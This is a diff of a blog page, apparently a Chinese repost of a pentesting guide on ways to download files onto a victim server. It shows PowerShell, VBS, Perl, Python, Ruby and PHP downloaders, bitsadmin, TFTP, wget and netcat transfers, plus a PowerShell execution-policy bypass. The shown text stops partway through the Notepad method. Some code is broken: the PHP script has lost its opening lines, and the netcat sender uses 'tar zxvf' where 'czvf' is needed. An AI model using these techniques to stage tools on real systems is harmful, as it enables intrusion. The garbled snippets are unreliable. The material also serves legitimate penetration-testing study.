@@ -87,13 +87,13 @@ $p =,">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    11k
+                    5.7k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    10 mins.
+                    5 mins.
                 </span>
                 
                 
@@ -130,69 +130,136 @@ $p =,">
             <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
 <p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
 <h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">$p = New-Object System.Net.WebClient
+$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)
+
+如：$p.DownloadFile(&quot;http://192.168.0.111:3737/test.txt&quot;,&quot;E:text_download.txt&quot;)
+注意：下载的路径如果出现中文字的路径，可能会出错
+</code></pre>
 <p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">PS C:&gt; .test.ps1
+</code></pre>
 <p>如果Powershell禁止执行了，使用如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">C:&gt;powershell set-executionpolicy unrestricted
+</code></pre>
 <p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
 <p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
-<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
+<pre><code>E:\&gt;powershell executionpolicy
+Restricted
+</code></pre><p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
+<pre><code>E:\&gt;powershell -exec bypass
+Windows PowerShell
+版权所有 (C) 2009 Microsoft Corporation。保留所有权利。
+
+PS E:\&gt; executionpolicy
+Bypass
+</code></pre><h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
+<pre><code class="bash">Set args = Wscript.Arguments
+Url = &quot;http://domain/file&quot;
+dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, Url, False
+xHttp.Send
+with bStrm
+    .type = 1 &#39;
+    .open
+    .write xHttp.responseBody
+    .savetofile &quot; C:\%homepath%\file&quot;, 2 &#39;
+end with
+</code></pre>
 <p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">C:&gt;cscript test.vbs
+</code></pre>
 <h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">#!/usr/bin/perl 
+use LWP::Simple; 
+getstore(&quot;http://domain/file&quot;, &quot;file&quot;);
+</code></pre>
 <p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# perl test.pl
+</code></pre>
 <h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">#!/usr/bin/python 
+import urllib2 
+u = urllib2.urlopen(&#39;http://domain/file&#39;) 
+localFile = open(&#39;local_file&#39;, &#39;w&#39;) 
+localFile.write(u.read()) 
+localFile.close()
+</code></pre>
 <p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# python test.py
+</code></pre>
 <h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">#!/usr/bin/ruby
+require &#39;net/http&#39;
+Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
+r = http.get(&quot;/file&quot;)
+open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
+file.write(r.body)
+}
+}
+</code></pre>
 <p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# ruby test.rb
+</code></pre>
 <h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">#!/usr/bin/php 
+&quot;http://example.com/file&quot;);
+$lf = &quot;local_file&quot;;         
+$fh = fopen($lf, &#39;w&#39;);         
+fwrite($fh, $data[0]);         
+fclose($fh); 
+?&gt;
+</code></pre>
 <p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">root@kali:~# php test.php
+</code></pre>
 <h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">ftp 127.0.0.1 username password get file exit
+</code></pre>
 <h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
 <p>复制</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
+</code></pre>
 <h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">bitsadmin /transfer n http://domain/file c:%homepath%file
+</code></pre>
 <h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">wget http://example.com/file
+</code></pre>
 <h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">cat file | nc -l 1234
+</code></pre>
 <p>target执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">nc host_ip 1234 &gt; file
+</code></pre>
 <p><strong>Netcat补充</strong>：</p>
 <p><code>传输文件</code></p>
 <p>方法一：</p>
 <p>接收端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">nc -l 3737 &gt; test.txt
+</code></pre>
 <p>传送端，发送</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">nc [ip] 3737 &lt; test.txt
+</code></pre>
 <p>方法二：</p>
 <p>发送端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">nc -l 3737 &lt; test.txt
+</code></pre>
 <p>接收端，连接</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">nc [ip] 3737 &gt; test.txt
+</code></pre>
 <p><code>传送目录</code></p>
 <p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
 <p>接收端，先监听并准备解压缩</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">nc -l 3737 | tar zxvf -
+</code></pre>
 <p>发送端，压缩并发送</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">tar zxvf - * | nc [ip] 3737
+</code></pre>
 <h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">net use x: \127.0.0.1\share /user:example.comuserID myPassword
+</code></pre>
 <h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
 <li><ol>
 <li>打开记事本</li>
